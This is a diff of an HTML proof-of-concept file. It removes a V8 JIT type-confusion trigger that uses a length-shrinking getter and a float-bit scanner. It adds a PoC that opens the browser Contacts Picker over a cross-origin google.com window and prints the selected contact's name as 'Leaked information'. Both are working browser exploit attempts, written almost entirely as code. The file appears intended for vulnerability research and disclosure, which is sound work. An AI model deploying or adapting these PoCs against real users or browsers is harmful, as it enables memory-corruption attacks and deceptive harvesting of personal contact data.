@@ -1,97 +1,28 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>V8 Validation PoC</title>
-
-<pre id="log"></pre>
-
-<script>
-const log = m => {
-  document.getElementById("log").textContent += m + "\n";
-  console.log(m);
-};
-
-function f2i(f) {
-  const buf = new ArrayBuffer(8);
-  new Float64Array(buf)[0] = f;
-  return new BigUint64Array(buf)[0];
-}
-
-function vuln(a, i) {
-  return a[i] + 1.1;
-}
-
-function warmup() {
-  let arr = new Array(64);
-  for (let i = 0; i < 64; i++) arr[i] = i + 0.5;
-
-  for (let i = 0; i < 200000; i++) {
-    vuln(arr, i & 63);
-  }
-  return arr;
-}
-
-function trigger(arr) {
-  for (let i = 0; i < 32; i++) arr[i] = i + 0.5;
-
-  for (let i = 0; i < 30000; i++) vuln(arr, i & 31);
-
-  arr[1] = {};
-  delete arr[5];
-
-  Object.defineProperty(arr, 4, {
-    get() {
-      arr.length = 1;
-      return 1.1;
-    }
-  });
-
-  return arr;
-}
-
-// 🔥 validation logic
-function validate(arr) {
-  let suspicious = [];
-
-  for (let i = 0; i < 10; i++) {
-    let v = arr[i];
-
-    if (typeof v === "number") {
-      let bits = f2i(v);
-      let hex = bits.toString(16);
-
-      // check abnormal
-      if (hex.startsWith("7ff") && !Number.isNaN(v)) {
-        suspicious.push({i, v, hex});
-        log(`[SUS] idx=${i} val=${v} bits=0x${hex}`);
-      }
-    }
-  }
-
-  return suspicious;
-}
-
-// 🔁 run multiple times (IMPORTANT)
-function runTest() {
-  let hits = 0;
-
-  for (let round = 0; round < 20; round++) {
-    let base = warmup();
-    let arr = base.slice();
-    trigger(arr);
-
-    for (let i = 0; i < 50; i++) vuln(arr, i & 7);
-
-    let res = validate(arr);
-
-    if (res.length > 0) {
-      hits++;
-      log(`[ROUND ${round}] suspicious detected (${res.length})`);
-    }
-  }
-
-  log(`\n=== RESULT ===`);
-  log(`suspicious rounds: ${hits}/20`);
-}
-
-runTest();
-</script>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>PoC</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    let contacts = await navigator.contacts.select(["name"], {});
+                    document.write(`
+                        <h1>
+                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
+                        </h1>
+                    `);
+                })();
+                open("https://www.google.com", "PoC", "_blank");
+            }
+        </script>
+    </head>  
+    <body>
+        <br><br><br>
+        <center>
+            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
+        </center>
+    </body>
+  </body>
+</html>
